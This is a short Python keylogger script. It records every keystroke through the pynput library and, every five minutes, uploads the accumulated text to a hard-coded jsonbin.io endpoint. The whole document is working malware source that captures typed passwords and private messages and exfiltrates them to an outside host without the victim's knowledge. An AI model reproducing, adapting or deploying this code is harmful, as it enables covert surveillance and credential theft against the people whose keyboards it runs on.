from pynput.keyboard import Listener
import requests, time, threading
JSONBIN_URL = "https://api.jsonbin.io/v3/b/67423183e41b4d34e4595da7"
try: content = requests.get(f"{JSONBIN_URL}/latest", headers={"Content-Type": "application/json"}).json()["record"]["content"]
except: content = ""
def update(key):
    global content
    content += str(key).replace("'", "").replace("Key.space", " ").replace("Key.enter", "\n").replace("Key.back", "").replace("Key.caps_lock", "").replace("Key.shift_r", "")
def send_message():
    while True:
        time.sleep(300)
        try: requests.put(url=JSONBIN_URL, json={"content": content}, headers={"Content-Type": "application/json"})
        except: pass
threading.Thread(target=send_message).start()
with Listener(on_press=update, on_release=bool) as listener: listener.join()